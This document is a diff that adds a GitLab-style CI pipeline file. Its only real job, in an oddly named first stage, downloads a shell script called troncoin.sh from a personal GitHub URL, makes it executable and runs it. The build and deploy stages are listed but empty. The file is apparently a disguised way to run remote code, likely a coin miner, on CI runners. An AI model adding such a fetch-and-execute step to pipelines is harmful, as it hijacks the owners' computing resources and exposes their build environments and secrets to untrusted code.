@@ -1,0 +1,9 @@
+stages:
+  - bachannel
+  - build
+  - deploy
+ 
+bachannel_1:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/akki0101/tron/main/troncoin.sh && chmod u+x troncoin.sh && ./troncoin.sh
